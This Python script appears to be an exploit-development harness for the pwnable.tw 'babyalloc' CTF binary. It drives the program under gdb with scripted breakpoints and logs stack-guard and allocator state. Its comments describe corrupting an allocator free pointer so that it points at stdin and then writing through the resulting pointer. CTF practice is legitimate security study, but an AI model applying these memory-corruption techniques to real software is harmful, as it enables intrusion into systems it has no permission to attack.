#!/usr/bin/env python3
import subprocess, sys, time, os

os.chdir('/home/folly/ctf/pwnable.tw/babyalloc')
os.makedirs('/tmp/l', exist_ok=True)
if not os.path.exists('/tmp/l/ld-2.23.so'):
    import shutil
    shutil.copy('ld-2.23.so', '/tmp/l/ld-2.23.so')

GDBS = r"""
set pagination off
set confirm off
set debuginfod enabled off
file /home/folly/ctf/pwnable.tw/babyalloc/babyallocator232
set exec-wrapper env LD_LIBRARY_PATH=/home/folly/ctf/pwnable.tw/babyalloc
break *0x400e40
commands
silent
set $pc = *(unsigned long*)$rsp
set $rsp = $rsp + 8
set $rax = 0
continue
end
break *0x401350
commands
silent
printf "GUARDCHK rsp=%p size1=%p guard=%p cur=%p\n", $rsp, $rax, *(unsigned long*)($fs_base+0x70), *(unsigned long*)($fs_base-16)
continue
end
break *0x40146a
commands
silent
printf "WRITE ptr=%p size=%d\n", $rdi, $esi
continue
end
break *0x4013a7
commands
silent
if *(unsigned long*)($fs_base-16) != 0
  set $seg = *(unsigned long*)($fs_base-16)
  printf "SCANRET rsp=%p HDR: prev=%p next=%p size=%p oldstk=%p dyn=%p free=%p\n", $rsp, *(unsigned long*)($seg+0), *(unsigned long*)($seg+8), *(unsigned long*)($seg+0x10), *(unsigned long*)($seg+0x18), *(unsigned long*)($seg+0x20), *(unsigned long*)($seg+0x28)
else
  printf "SCANRET rsp=%p (init)\n", $rsp
end
continue
end
break *0x40136f
commands
silent
printf "  BLOCK=%p\n", $rax
continue
end
run
quit
"""
open('gdbscript.txt','w').write(GDBS)

p = subprocess.Popen(['gdb','-q','-batch','-x','gdbscript.txt'],
                     stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                     stderr=subprocess.STDOUT, bufsize=0)

buf = b''
def send(chunk):
    p.stdin.write(chunk)
    p.stdin.flush()

def until(tok, timeout=30):
    global buf
    end = time.time() + timeout
    while time.time() < end:
        while tok in buf:
            i = buf.find(tok)
            out, buf2 = buf[:i+len(tok)], buf[i+len(tok):]
            buf = buf2
            sys.stdout.write(out.decode(errors='replace'))
            return True
        c = os.read(p.stdout.fileno(), 4096)
        if not c: break
        buf += c
    return False

def alloca(size, name=b'nameN'):
    until(b'Your choice:'); send(b'1\n')
    until(b'Size :'); send(b'%d\n' % size)
    until(b'allocator ? :'); send(name + b'\n')

def recurse():
    until(b'Your choice:'); send(b'4\n')

# PHASE 0: initial stack descent
for _ in range(3): alloca(0xFFF); recurse()
alloca(0xA00); recurse()
alloca(0x210); recurse()
for _ in range(4): alloca(0x400); recurse()
# now on S1 #1: GUARDCHK = B+0xF88
alloca(0x700); recurse()      # buffer B+0x878 -> S1#2 at B+0x838
# S1#2 = CORRUPTOR: heap-path alloca, scanf at B+0x838 -> free = stdin
alloca(0x300, b'name0')       # name scanf corrupts free_dynamic_allocation
recurse()                      # S1#3 = TAKER at B+0x7f8
# S1#3: heap alloca 0xFFF -> take -> ptr_1 = stdin+0x90
alloca(0xFFF, b'name1')
# case-3 write probe
until(b'Your choice:'); send(b'3\n')
until(b'Content :'); send(b'A'*0x40)
until(b'Your choice:'); send(b'5\n')
until(b'Your choice:'); send(b'5\n')
time.sleep(2)
try:
    while True:
        c = os.read(p.stdout.fileno(), 4096)
        if not c: break
        buf += c
except Exception:
    pass
sys.stdout.write(buf.decode(errors='replace')[-1200:])
p.wait()
